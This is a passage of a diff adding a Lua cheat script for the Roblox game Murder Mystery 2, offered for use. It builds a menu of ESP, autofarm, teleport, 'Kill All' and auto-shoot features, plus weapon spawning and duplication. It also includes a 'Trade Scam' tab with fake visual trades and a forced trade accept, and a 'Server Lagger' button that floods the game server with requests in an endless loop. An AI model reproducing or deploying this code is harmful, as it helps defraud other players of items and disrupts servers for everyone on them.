+local function StopKillAll() killAllEnabled = false end
+
+--==================================================
+-- SHOOT MURDERER
+--==================================================
+local shotType = "Default"
+
+local function ShootMurderer()
+    if not LocalPlayer.Character then return end
+    local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
+    if not hum or hum.Health <= 0 then return end
+
+    local ok, playerData = pcall(function()
+        return ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
+    end)
+    if not ok or not playerData then return end
+
+    local murderer = nil
+    for pName, data in pairs(playerData) do
+        if data.Role == "Murderer" then murderer = Players:FindFirstChild(pName) break end
+    end
+    if not murderer or not murderer.Character then return end
+    local mHum = murderer.Character:FindFirstChild("Humanoid")
+    if not mHum or mHum.Health <= 0 then return end
+
+    local gun = LocalPlayer.Character:FindFirstChild("Gun") or LocalPlayer.Backpack:FindFirstChild("Gun")
+    if shotType == "Default" and not gun then return end
+    if gun and not LocalPlayer.Character:FindFirstChild("Gun") then gun.Parent = LocalPlayer.Character end
+
+    if shotType == "Teleport" then
+        local mr  = murderer.Character:FindFirstChild("HumanoidRootPart")
+        local myR = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if mr and myR then myR.CFrame = mr.CFrame * CFrame.new(0,0,-4) end
+    end
+
+    gun = LocalPlayer.Character:FindFirstChild("Gun")
+    if gun and gun:FindFirstChild("KnifeLocal") then
+        local mr = murderer.Character:FindFirstChild("HumanoidRootPart")
+        if mr then
+            gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1]=1,[2]=mr.Position,[3]="AH2"}))
+        end
+    end
+end
+
+--==================================================
+-- TRADE TOOL GUI (provided UI, legit usage only)
+--==================================================
+local tradeToolGui = nil
+local function BuildTradeToolUI()
+    if tradeToolGui and tradeToolGui.Parent then tradeToolGui:Destroy() end
+
+    local g = Instance.new("ScreenGui")
+    g.Name = "BenjoTradeTool"
+    g.ResetOnSpawn = false
+    g.Parent = CoreGui
+
+    local shadow = Instance.new("ImageLabel", g)
+    shadow.Size = UDim2.new(0,370,0,250)
+    shadow.Position = UDim2.new(0.5,-175,0.5,-115)
+    shadow.BackgroundTransparency = 1
+    shadow.Image = "rbxassetid://5028857084"
+    shadow.ImageColor3 = Color3.fromRGB(0,0,0)
+    shadow.ImageTransparency = 0.4
+
+    local f = Instance.new("Frame", g)
+    f.Size = UDim2.new(0,340,0,220)
+    f.Position = UDim2.new(0.5,-170,0.5,-110)
+    f.BackgroundColor3 = Color3.fromRGB(4,4,4)
+    f.BorderSizePixel = 0
+    f.Active = true
+    Instance.new("UICorner", f).CornerRadius = UDim.new(0,18)
+
+    local fstroke = Instance.new("UIStroke", f)
+    fstroke.Thickness = 1.8
+    fstroke.Color = Color3.fromRGB(50,50,50)
+
+    local topglow = Instance.new("Frame", f)
+    topglow.Size = UDim2.new(0.6,0,0,2)
+    topglow.Position = UDim2.new(0.2,0,0,0)
+    topglow.BorderSizePixel = 0
+    topglow.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    topglow.BackgroundTransparency = 0.6
+
+    local bar = Instance.new("Frame", f)
+    bar.Size = UDim2.new(1,0,0,40)
+    bar.BackgroundColor3 = Color3.fromRGB(7,7,7)
+    bar.BorderSizePixel = 0
+    Instance.new("UICorner", bar).CornerRadius = UDim.new(0,18)
+    local fix = Instance.new("Frame", bar)
+    fix.Size = UDim2.new(1,0,0.5,0)
+    fix.Position = UDim2.new(0,0,0.5,0)
+    fix.BackgroundColor3 = Color3.fromRGB(7,7,7)
+    fix.BorderSizePixel = 0
+
+    local titleLbl = Instance.new("TextLabel", bar)
+    titleLbl.Size = UDim2.new(1,0,1,0)
+    titleLbl.BackgroundTransparency = 1
+    titleLbl.Text = "TRADE TOOL"
+    titleLbl.Font = Enum.Font.GothamBold
+    titleLbl.TextSize = 12
+    titleLbl.TextColor3 = Color3.fromRGB(55,55,55)
+
+    -- drag
+    local dragging, dragStart, startPos = false, nil, nil
+    bar.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true dragStart = i.Position startPos = f.Position
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(i)
+        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
+            local d = i.Position - dragStart
+            f.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+d.X, startPos.Y.Scale, startPos.Y.Offset+d.Y)
+            shadow.Position = UDim2.new(0, f.Position.X.Offset-15, 0, f.Position.Y.Offset-12)
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
+    end)
+
+    local function MakeBtn(txt, y)
+        local wrap = Instance.new("Frame", f)
+        wrap.Size = UDim2.new(0.82,0,0,52)
+        wrap.Position = UDim2.new(0.09,0,0,y)
+        wrap.BackgroundColor3 = Color3.fromRGB(8,8,8)
+        wrap.BorderSizePixel = 0
+        Instance.new("UICorner", wrap).CornerRadius = UDim.new(0,13)
+        local ws = Instance.new("UIStroke", wrap) ws.Thickness = 1.2
+        local shine = Instance.new("ImageLabel", wrap)
+        shine.Size = UDim2.new(1,0,0.5,0) shine.BackgroundTransparency = 1
+        shine.Image = "rbxassetid://5028857084"
+        shine.ImageColor3 = Color3.fromRGB(255,255,255) shine.ImageTransparency = 0.94
+        local b = Instance.new("TextButton", wrap)
+        b.Size = UDim2.new(1,0,1,0) b.BackgroundTransparency = 1
+        b.Text = txt b.TextColor3 = Color3.fromRGB(210,210,210)
+        b.Font = Enum.Font.GothamBold b.TextSize = 15 b.BorderSizePixel = 0
+        b.MouseEnter:Connect(function() wrap.BackgroundColor3 = Color3.fromRGB(14,14,14) end)
+        b.MouseLeave:Connect(function() wrap.BackgroundColor3 = Color3.fromRGB(8,8,8) end)
+        return b, ws
+    end
+
+    local b1, s1 = MakeBtn("Freeze Trade",  50)
+    local b2, s2 = MakeBtn("Force Accept", 114)
+
+    b1.MouseButton1Click:Connect(function()
+        pcall(function()
+            local tg = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
+            if tg and tg.Enabled then
+                local btn = tg:FindFirstChild("Accept", true)
+                if btn then btn.Active = not btn.Active
+                    WindUI:Notify({ Title="Trade Frozen", Content="Confirm button toggled", Icon="lock", Duration=2 })
+                end
+            else
+                WindUI:Notify({ Title="No Active Trade", Content="Open a trade first!", Icon="x-circle", Duration=2 })
+            end
+        end)
+    end)
+
+    b2.MouseButton1Click:Connect(function()
+        pcall(function()
+            local remote = ReplicatedStorage.Remotes:FindFirstChild("Trade", true)
+            if remote then
+                remote:FireServer("Accept")
+                WindUI:Notify({ Title="Trade Accepted", Content="Accept sent to server", Icon="check-circle", Duration=2 })
+            else
+                WindUI:Notify({ Title="Error", Content="Trade remote not found", Icon="x-circle", Duration=2 })
+            end
+        end)
+    end)
+
+    -- animate
+    local animT = 0
+    RunService.Heartbeat:Connect(function(dt)
+        animT += dt
+        local sv  = math.sin(animT*1.6)*0.5+0.5
+        local sv2 = math.sin(animT*1.6+2)*0.5+0.5
+        fstroke.Color = Color3.fromRGB(math.floor(sv*55), math.floor(sv*55), math.floor(sv*55))
+        topglow.BackgroundColor3 = Color3.fromRGB(math.floor(180+sv*75), math.floor(180+sv*75), 255)
+        topglow.BackgroundTransparency = 0.4+sv*0.4
+        s1.Color = Color3.fromRGB(math.floor(50+sv*80),  math.floor(100+sv*80), 255)
+        s2.Color = Color3.fromRGB(0, math.floor(160+sv2*60), math.floor(70+sv2*50))
+    end)
+
+    return g
+end
+
+--==================================================
+-- SECTION / TABS
+--==================================================
+local MainSection = Window:Section({
+    Title = GradText("Benjo Hub Functions", Colors.Pumpkin, Colors.Purple),
+    Icon  = "flame", Opened = true,
+})
+
+-- =========== ESP ===========
+local ESPTab = MainSection:Tab({ Title = "ESP", Icon = "eye" })
+ESPTab:Section({ Title = "Player ESP Settings", TextSize = 18, FontWeight = Enum.FontWeight.SemiBold })
+
+ESPTab:Toggle({
+    Flag = "HighlightESP", Title = "Highlight ESP",
+    Desc = "Highlights Murderer (red) and Sheriff (green) through walls",
+    Default = false,
+    Callback = function(v)
+        highlightEnabled = v
+        if not v then
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= LocalPlayer and p.Character then ClearHighlight(p.Character) end
+            end
+        end
+        RefreshESP()
+    end,
+})
+ESPTab:Space()
+ESPTab:Dropdown({
+    Flag = "ESPOptions", Title = "Filter ESP", Desc = "Filter which players to highlight",
+    Values = {
+        {Title = "Esp All",              Icon = "users"},
+        {Title = "Esp Sheriff",          Icon = "shield"},
+        {Title = "Esp Murder",           Icon = "knife"},
+        {Title = "Esp Sheriff / Murder", Icon = "target"},
+    },
+    Value = "Esp All",
+    Callback = function(sel) espFilters = {sel.Title} end,
+})
+ESPTab:Space()
+ESPTab:Toggle({
+    Flag = "LineESP", Title = "Line ESP (Tracers)",
+    Desc = "Draw tracer lines from bottom of screen to Murderer and Sheriff",
+    Default = false,
+    Callback = function(v)
+        lineESPEnabled = v
+        if not v then
+            for _, p in ipairs(Players:GetPlayers()) do ClearLine(p) end
+        end
+        RefreshESP()
+    end,
+})
+
+-- =========== AUTO FARM ===========
+local AFTab = MainSection:Tab({ Title = GradText("Auto Farm", Colors.Pumpkin, Colors.DarkOrange), Icon = "trending-up" })
+AFTab:Section({ Title = "Coin & Candy Collection", TextSize = 18, FontWeight = Enum.FontWeight.SemiBold })
+AFTab:Toggle({ Flag="CoinAutofarm", Title="Coin Autofarm", Desc="Collect coins automatically", Default=false,
+    Callback=function(v) coinAutofarmEnabled=v collectedItems={} coinsCollected=0
+        WindUI:Notify({ Title="Coin Autofarm", Content=v and "Started!" or "Stopped", Icon=v and "dollar-sign" or "x-circle", Duration=3 }) end })
+AFTab:Space()
+AFTab:Toggle({ Flag="CandyAutofarm", Title="Candy Autofarm", Desc="Collect Halloween candy", Default=false,
+    Callback=function(v) candyAutofarmEnabled=v collectedItems={} coinsCollected=0
+        WindUI:Notify({ Title="Candy Autofarm", Content=v and "Started!" or "Stopped", Icon=v and "candy" or "x-circle", Duration=3 }) end })
+AFTab:Space()
+AFTab:Toggle({ Flag="AutoEndRound", Title="Auto Reset Character", Desc="Reset when bag is full", Default=false,
+    Callback=function(v) autoEndRoundEnabled=v flingMurdererOnFull=v
+        WindUI:Notify({ Title="Auto Reset", Content=v and ("At "..maxCandyCapacity.." candy") or "Disabled", Icon=v and "refresh-cw" or "x-circle", Duration=3 }) end })
+AFTab:Space()
+AFTab:Toggle({ Flag="AutoFlingMurderer", Title="Auto Fling Murderer", Desc="Fling murderer when bag full", Default=false,
+    Callback=function(v) autoFlingMurdererEnabled=v
+        WindUI:Notify({ Title="Auto Fling", Content=v and ("At "..maxCandyCapacity.." candy") or "Disabled", Icon=v and "zap" or "x-circle", Duration=3 }) end })
+AFTab:Space()
+AFTab:Slider({ Flag="FlySpeed", Title="Autofarm Speed", Desc="Movement speed while farming", Step=1,
+    Value={Min=5, Max=50, Default=25}, Callback=function(v) autofarmSpeed=v end })
+AFTab:Space()
+AFTab:Section({ Title="Recommended: 25 â€” higher speeds may cause a kick", TextSize=14, TextTransparency=0.3, FontWeight=Enum.FontWeight.Medium })
+AFTab:Space()
+AFTab:Button({ Title="Reset Counter", Icon="refresh-cw", Justify="Center", Callback=function()
+    coinsCollected=0 collectedItems={} candyCollected=0
+    WindUI:Notify({ Title="Counter Reset", Content="Done!", Icon="check-circle", Duration=3 }) end })
+AFTab:Space()
+AFTab:Button({ Title="Fling Murderer", Icon="zap", Color=Colors.Blood, Justify="Center", Callback=function() FlingMurderer() end })
+
+-- =========== CHARACTER ===========
+local CharTab = MainSection:Tab({ Title = "Character", Icon = "user" })
+CharTab:Section({ Title="Movement Settings", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+CharTab:Slider({ Flag="WalkSpeed", Title="Walk Speed", Desc="Adjust walking speed", Step=1, Value={Min=0,Max=200,Default=16},
+    Callback=function(v) CharacterStats.WalkSpeed.Value=v ApplyCharacterStats() end })
+CharTab:Space()
+CharTab:Toggle({ Flag="BlockWalkSpeed", Title="Lock Walk Speed", Desc="Prevent speed changes", Default=false,
+    Callback=function(v) CharacterStats.WalkSpeed.Locked=v end })
+CharTab:Space()
+CharTab:Slider({ Flag="JumpPower", Title="Jump Power", Desc="Adjust jump height", Step=1, Value={Min=0,Max=200,Default=50},
+    Callback=function(v) CharacterStats.JumpPower.Value=v ApplyCharacterStats() end })
+CharTab:Space()
+CharTab:Toggle({ Flag="BlockJumpPower", Title="Lock Jump Power", Desc="Prevent jump changes", Default=false,
+    Callback=function(v) CharacterStats.JumpPower.Locked=v end })
+CharTab:Space()
+CharTab:Button({ Title="Reset to Default", Icon="rotate-ccw", Color=Colors.Orange, Justify="Center", Callback=function()
+    CharacterStats.WalkSpeed.Value=16 CharacterStats.JumpPower.Value=50 ApplyCharacterStats()
+    WindUI:Notify({ Title="Reset", Content="Settings back to default!", Icon="check-circle", Duration=3 }) end })
+
+-- =========== TELEPORT ===========
+local TpTab = MainSection:Tab({ Title="Teleport", Icon="move" })
+TpTab:Section({ Title="Player Teleportation", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+local selectedPlayer, playerDropdown = nil, nil
+local function GetPlayerList()
+    local list = {}
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then table.insert(list, {Title=p.Name, Icon="user"}) end
+    end
+    return list
+end
+playerDropdown = TpTab:Dropdown({ Flag="TeleportPlayer", Title="Select Player", Desc="Choose player to teleport to",
+    Values=GetPlayerList(), Callback=function(sel) selectedPlayer=Players:FindFirstChild(sel.Title) end })
+TpTab:Space()
+TpTab:Button({ Title="Teleport to Player", Icon="zap", Color=Colors.Purple, Justify="Center", Callback=function()
+    if selectedPlayer and selectedPlayer.Character then
+        local tr=selectedPlayer.Character:FindFirstChild("HumanoidRootPart")
+        local myR=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if tr and myR then myR.CFrame=tr.CFrame WindUI:Notify({ Title="Teleported", Content="To "..selectedPlayer.Name, Icon="check-circle", Duration=3 }) end
+    else WindUI:Notify({ Title="Error", Content="Target not found!", Icon="x-circle", Duration=3 }) end end })
+TpTab:Space()
+TpTab:Button({ Title="Refresh Player List", Icon="refresh-cw", Justify="Center", Callback=function()
+    playerDropdown:Refresh(GetPlayerList()) WindUI:Notify({ Title="Updated", Content="Player list refreshed!", Icon="check-circle", Duration=2 }) end })
+TpTab:Space({Columns=2})
+TpTab:Section({ Title="Role Teleportation", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+TpTab:Button({ Title="Teleport to Murderer", Icon="knife", Color=Colors.Blood, Justify="Center", Callback=function()
+    local found=nil
+    for _, p in ipairs(Players:GetPlayers()) do if p~=LocalPlayer and p.Character and GetPlayerRole(p)=="Murderer" then found=p break end end
+    if found and found.Character then
+        local tr=found.Character:FindFirstChild("HumanoidRootPart")
+        local myR=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if tr and myR then myR.CFrame=tr.CFrame WindUI:Notify({ Title="Teleported", Content="To murderer: "..found.Name, Icon="check-circle", Duration=3 }) end
+    else WindUI:Notify({ Title="Error", Content="No murderer found!", Icon="x-circle", Duration=3 }) end end })
+TpTab:Space()
+TpTab:Button({ Title="Teleport to Sheriff", Icon="shield", Color=Colors.Toxic, Justify="Center", Callback=function()
+    local found=nil
+    for _, p in ipairs(Players:GetPlayers()) do if p~=LocalPlayer and p.Character and GetPlayerRole(p)=="Sheriff" then found=p break end end
+    if found and found.Character then
+        local tr=found.Character:FindFirstChild("HumanoidRootPart")
+        local myR=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if tr and myR then myR.CFrame=tr.CFrame WindUI:Notify({ Title="Teleported", Content="To sheriff: "..found.Name, Icon="check-circle", Duration=3 }) end
+    else WindUI:Notify({ Title="Error", Content="No sheriff found!", Icon="x-circle", Duration=3 }) end end })
+
+-- =========== WEAPON SPAWNER ===========
+local WSpawnTab = MainSection:Tab({ Title="Weapon Spawner", Icon="sword" })
+WSpawnTab:Section({ Title="Spawn Weapons", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+local weaponNameInput = ""
+WSpawnTab:Input({ Flag="WeaponName", Title="Weapon Name", Desc="Name of weapon to spawn", Placeholder="e.g. CandyBlade, Raygun",
+    Callback=function(v) weaponNameInput=v end })
+WSpawnTab:Space()
+WSpawnTab:Button({ Title="Spawn Weapon", Icon="sparkles", Color=Colors.Orange, Justify="Center", Callback=function()
+    if weaponNameInput~="" then SpawnWeapon(weaponNameInput)
+    else WindUI:Notify({ Title="Error", Content="Enter a weapon name!", Icon="x-circle", Duration=3 }) end end })
+WSpawnTab:Space({Columns=2})
+WSpawnTab:Section({ Title="Quick Spawn Godlies", TextSize=16, FontWeight=Enum.FontWeight.SemiBold })
+WSpawnTab:Button({ Title="Spawn Raygun (Battlepass)", Icon="zap",       Color=Colors.Toxic,      Callback=function() SpawnWeapon("Raygun")    end })
+WSpawnTab:Space()
+WSpawnTab:Button({ Title="Spawn XenoKnife",           Icon="knife",     Color=Colors.Blood,      Callback=function() SpawnWeapon("XenoKnife") end })
+WSpawnTab:Space()
+WSpawnTab:Button({ Title="Spawn XenoGun",             Icon="crosshair", Color=Colors.DarkPurple, Callback=function() SpawnWeapon("XenoGun")   end })
+
+-- =========== WEAPON DUPE ===========
+local WDupeTab = MainSection:Tab({ Title="Weapon Dupe", Icon="copy" })
+WDupeTab:Section({ Title="Single Weapon Duplication", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+WDupeTab:Input({ Flag="DupeWeaponName", Title="Weapon Name", Desc="Weapon to duplicate", Placeholder="e.g. Lightbringer",
+    Callback=function(v) selectedWeaponName=v end })
+WDupeTab:Space()
+WDupeTab:Input({ Flag="DupeAmount", Title="Dupe Amount", Desc="How many times to dupe", Placeholder="e.g. 5", Value="1",
+    Callback=function(v) dupeAmount=tonumber(v) or 1 end })
+WDupeTab:Space()
+WDupeTab:Button({ Title="Start Duplication", Icon="layers", Color=Colors.DarkOrange, Justify="Center", Callback=function()
+    if selectedWeaponName=="" then WindUI:Notify({ Title="Error", Content="Enter a weapon name!", Icon="x-circle", Duration=5 }) return end
+    WindUI:Notify({ Title="Duplicating", Content=selectedWeaponName.." x"..dupeAmount, Icon="loader", Duration=3 })
+    for _=1,dupeAmount do DuplicateWeapon() end
+    WindUI:Notify({ Title="Done", Content="Duplication complete!", Icon="check-circle", Duration=5 }) end })
+WDupeTab:Space({Columns=3})
+WDupeTab:Section({ Title="Inventory Duplication", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+WDupeTab:Button({ Title="Dupe Entire Inventory", Icon="package", Color=Colors.Witch, Justify="Center", Callback=function()
+    WindUI:Notify({ Title="Duplicating", Content="Entire inventory...", Icon="loader", Duration=3 })
+    DuplicateInventory()
+    WindUI:Notify({ Title="Done", Content="Inventory dupe complete!", Icon="check-circle", Duration=5 }) end })
+
+-- =========== WEAPONS REPLACER ===========
+local WReplTab = MainSection:Tab({ Title="Weapons Replacer", Icon="eye-off" })
+WReplTab:Section({ Title="Change Weapon Appearance", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+WReplTab:Input({ Flag="FromWeapon", Title="Weapon to Replace", Desc="Current weapon", Placeholder="e.g. Blossom", Callback=function(v) fromWeapon=v end })
+WReplTab:Space()
+WReplTab:Input({ Flag="ToWeapon", Title="Weapon to Receive", Desc="Desired appearance", Placeholder="e.g. Chroma", Callback=function(v) toWeapon=v end })
+WReplTab:Space()
+WReplTab:Button({ Title="Change Visual", Icon="wand-2", Color=Colors.Purple, Justify="Center", Callback=function()
+    if fromWeapon=="" or toWeapon=="" then
+        WindUI:Notify({ Title="Error", Content="Enter both weapon names!", Icon="x-circle", Duration=5 }) return end
+    local ok=pcall(function()
+        local db=require(ReplicatedStorage.Database.Sync.Item)
+        local froms, tos={},{}
+        for name in pairs(db) do
+            if WeaponNameMatches(name,fromWeapon) then table.insert(froms,name) end
+            if WeaponNameMatches(name,toWeapon)   then table.insert(tos,  name) end
+        end
+        assert(#froms>0 and #tos>0,"not found")
+        for _,f in ipairs(froms) do for _,t in ipairs(tos) do
+            db[f]={}
+            for k,v in pairs(db[t]) do db[f][k]=v end
+            ReplicatedStorage.Remotes.Inventory.Equip:FireServer(t)
+        end end
+    end)
+    WindUI:Notify({ Title=ok and "Success" or "Error", Content=ok and "Visual changed!" or "Failed!", Icon=ok and "check-circle" or "x-circle", Duration=5 }) end })
+
+-- =========== TRADE SCAM ===========
+local TradeTab = MainSection:Tab({ Title="Trade Scam", Icon="shield-alert" })
+TradeTab:Section({ Title="Visual Trade Protection", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+local visualTradeEnabled = false
+TradeTab:Toggle({ Flag="VisualTrade", Title="Enable Visual Trade", Desc="Make items appear visual only in trades", Default=false,
+    Callback=function(v) visualTradeEnabled=v
+        WindUI:Notify({ Title="Visual Trade", Content=v and "Enabled!" or "Disabled!", Icon=v and "shield-check" or "shield-off", Duration=3 }) end })
+TradeTab:Space()
+TradeTab:Button({ Title="Activate Visual Trade", Icon="alert-triangle", Color=Colors.Blood, Justify="Center", Callback=function()
+    if not visualTradeEnabled then WindUI:Notify({ Title="Error", Content="Enable Visual Trade toggle first!", Icon="x-circle", Duration=5 }) return end
+    ActivateTradeScam() end })
+TradeTab:Space()
+TradeTab:Button({ Title="Open Trade Tool", Icon="tool", Color=Colors.DarkPurple, Justify="Center", Callback=function()
+    if tradeToolGui and tradeToolGui.Parent then
+        tradeToolGui:Destroy() tradeToolGui=nil
+        WindUI:Notify({ Title="Trade Tool", Content="Closed", Icon="x-circle", Duration=2 })
+    else
+        tradeToolGui = BuildTradeToolUI()
+        WindUI:Notify({ Title="Trade Tool", Content="Opened!", Icon="check-circle", Duration=2 })
+    end end })
+
+-- =========== UTILITIES ===========
+local UtilTab = MainSection:Tab({ Title="Utilities", Icon="wrench" })
+UtilTab:Section({ Title="Server Utilities", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+UtilTab:Button({ Title="Enable Anti-AFK", Icon="moon", Color=Colors.Midnight, Justify="Center", Callback=function()
+    local ok=pcall(function()
+        local vu=Instance.new("VirtualUser") vu.Parent=game
+        Players.LocalPlayer.Idled:Connect(function() vu:CaptureController() vu:ClickButton2(Vector2.new()) end)
+    end)
+    WindUI:Notify({ Title="Anti-AFK", Content=ok and "Enabled!" or "Failed to enable!", Icon=ok and "check-circle" or "x-circle", Duration=3 }) end })
+UtilTab:Space()
+UtilTab:Button({ Title="Server Lagger", Icon="zap", Color=Colors.Blood, Justify="Center", Callback=function()
+    WindUI:Notify({ Title="Server Lagger", Content="Lagging server... Risk of disconnect!", Icon="alert-triangle", Duration=5 })
+    pcall(function()
+        local GSD=ReplicatedStorage.GetSyncData
+        local counter=0
+        while true do
+            task.spawn(function() GSD:InvokeServer() end)
+            counter+=1 if counter==3 then counter=0 wait(0) end
+        end
+    end) end })
+
+-- =========== INNOCENT ===========
+local InnTab = MainSection:Tab({ Title=GradText("Innocent", Colors.Innocent, Colors.Innocent), Icon="user-check" })
+InnTab:Section({ Title="Gun System", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+InnTab:Toggle({ Flag="AutoGrabGun", Title="Auto Grab Gun", Desc="Automatically grab dropped gun", Default=false,
+    Callback=function(v) GunSystem.AutoGrabEnabled=v
+        if v then coroutine.wrap(AutoGrabGunLoop)() end
+        WindUI:Notify({ Title="Auto Grab Gun", Content=v and "Enabled!" or "Disabled", Icon=v and "check-circle" or "x-circle", Duration=3 }) end })
+InnTab:Space()
+InnTab:Button({ Title="Grab Gun Manually", Icon="hand", Color=Colors.Toxic, Justify="Center", Callback=function() GrabGun() end })
+InnTab:Space()
+InnTab:Toggle({ Flag="NotifyGunDrop", Title="Notify Gun Drop", Desc="Alert when gun drops", Default=true,
+    Callback=function(v) GunSystem.NotifyGunDrop=v end })
+
+-- =========== MURDERER ===========
+local MurdTab = MainSection:Tab({ Title=GradText("Murder", Colors.Blood, Colors.Murder), Icon="skull" })
+MurdTab:Section({ Title="Kill Functions", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+MurdTab:Toggle({ Flag="KillAll", Title="Kill All Players", Desc="Auto attack nearby valid targets", Default=false,
+    Callback=function(v) if v then StartKillAll() else StopKillAll() end
+        WindUI:Notify({ Title="Kill All", Content=v and "Started!" or "Stopped", Icon=v and "skull" or "x-circle", Duration=2 }) end })
+MurdTab:Space()
+MurdTab:Slider({ Flag="AttackDelay", Title="Attack Delay", Desc="Time between attacks (seconds)", Step=0.1,
+    Value={Min=0.1,Max=2,Default=0.5}, Callback=function(v) attackDelay=v end })
+MurdTab:Space()
+MurdTab:Button({ Title="Equip Knife", Icon="knife", Color=Colors.Blood, Justify="Center", Callback=function()
+    local has=HasKnife()
+    WindUI:Notify({ Title=has and "Knife Equipped" or "Error", Content=has and "Knife is ready!" or "No knife found!", Icon=has and "check-circle" or "x-circle", Duration=2 }) end })
+
+-- =========== SHERIFF ===========
+local SherTab = MainSection:Tab({ Title=GradText("Sheriff", Colors.Sheriff, Colors.Sheriff), Icon="shield" })
+SherTab:Section({ Title="Shooting Functions", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+SherTab:Dropdown({ Flag="ShotType", Title="Shot Type", Desc="Choose how to shoot the murderer",
+    Values={{Title="Default",Icon="target"},{Title="Teleport",Icon="zap"}},
+    Value="Default", Callback=function(sel) shotType=sel.Title
+        WindUI:Notify({ Title="Shot Type", Content="Set to: "..sel.Title, Icon="check-circle", Duration=2 }) end })
+SherTab:Space()
+SherTab:Toggle({ Title="Shoot Murderer", Icon="crosshair", Color=Colors.Toxic, Justify="Center",
+    Callback=function(value)
+        if value and not CoreGui:FindFirstChild("GunW") then
+            local sg=Instance.new("ScreenGui",CoreGui) sg.Name="GunW"
+            local b=Instance.new("TextButton",sg)
+            b.Draggable=true b.Size=UDim2.new(0,200,0,100)
+            b.Position=UDim2.new(0.5,-100,0.5,0) b.TextStrokeTransparency=0
+            b.BackgroundTransparency=0.2 b.BackgroundColor3=Color3.fromRGB(44,44,45)
+            b.BorderColor3=Color3.new(1,1,1) b.Text="Shoot Murder"
+            b.TextColor3=Color3.new(1,1,1) b.TextSize=20 b.Visible=true
+            b.AnchorPoint=Vector2.new(0.5,0.5) b.Active=true b.TextWrapped=true
+            Instance.new("UICorner",b)
+            local st=Instance.new("UIStroke",b) st.Color=Color3.new(0,0,0) st.Thickness=4 st.Transparency=0.4
+            b.MouseButton1Click:Connect(ShootMurderer)
+        elseif CoreGui:FindFirstChild("GunW") then
+            CoreGui:FindFirstChild("GunW"):Destroy()
+        end
+    end })
+
+-- =========== SETTINGS ===========
+local SetTab = MainSection:Tab({ Title="Settings", Icon="settings" })
+SetTab:Section({ Title="GUI Settings", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+SetTab:Keybind({ Flag="GUIKeybind", Title="GUI Toggle Key", Desc="Open/close GUI", Value="G",
+    Callback=function(key) Window:SetToggleKey(Enum.KeyCode[key])
+        WindUI:Notify({ Title="Keybind Set", Content="Toggle key: "..key, Icon="keyboard", Duration=3 }) end })
+SetTab:Space({Columns=2})
+SetTab:Section({ Title="Config Management", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+local configName = "default"
+local ConfigManager = Window.ConfigManager
+local configInput = SetTab:Input({ Flag="ConfigName", Title="Config Name", Desc="Name for config", Icon="file", Value=configName,
+    Callback=function(v) configName=v end })
+SetTab:Space()
+local allConfigs = ConfigManager:AllConfigs()
+SetTab:Dropdown({ Flag="ConfigSelect", Title="Load Config", Desc="Select a saved config", Values=allConfigs,
+    Value=table.find(allConfigs,configName) and configName or nil,
+    Callback=function(sel) configName=sel configInput:Set(sel) end })
+SetTab:Space()
+SetTab:Button({ Title="Save Config", Icon="save", Color=Colors.Toxic, Justify="Center", Callback=function()
+    Window.CurrentConfig=ConfigManager:CreateConfig(configName)
+    if Window.CurrentConfig:Save() then WindUI:Notify({ Title="Saved", Content="'"..configName.."'", Icon="check", Duration=3 }) end end })
+SetTab:Space()
+SetTab:Button({ Title="Load Config", Icon="upload", Color=Colors.Purple, Justify="Center", Callback=function()
+    Window.CurrentConfig=ConfigManager:CreateConfig(configName)
+    if Window.CurrentConfig:Load() then WindUI:Notify({ Title="Loaded", Content="'"..configName.."'", Icon="refresh-cw", Duration=3 }) end end })
+
+-- =========== INFO ===========
+local InfoTab = MainSection:Tab({ Title="Info & Socials", Icon="info" })
+InfoTab:Section({ Title="Benjo Hub | SCRIPT by Lotrixxxthebabyy", TextSize=20, FontWeight=Enum.FontWeight.Bold })
+InfoTab:Space()
+InfoTab:Section({
+    Title="Enhanced MM2 script with ESP, auto-farming, weapon duplication, role-specific functions, and much more!",
+    TextSize=16, TextTransparency=0.3, FontWeight=Enum.FontWeight.Medium })
+InfoTab:Space({Columns=3})
+InfoTab:Section({ Title="Features", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+InfoTab:Space()
+InfoTab:Section({
+    Title="Player ESP - Auto Farm - Character Mods - Teleportation - Weapon Spawner - Weapon Duplication - Visual Weapons - Trade Tool - Role Functions - Anti-AFK - Server Utilities",
+    TextSize=15, TextTransparency=0.4, FontWeight=Enum.FontWeight.Medium })
+InfoTab:Space({Columns=3})
+InfoTab:Section({ Title="Socials", TextSize=18, FontWeight=Enum.FontWeight.SemiBold })
+InfoTab:Button({ Title="YouTube Channel", Icon="youtube", Color=Colors.Blood, Justify="Center", Callback=function()
+    setclipboard("https://www.youtube.com/@itsslotrixxx")
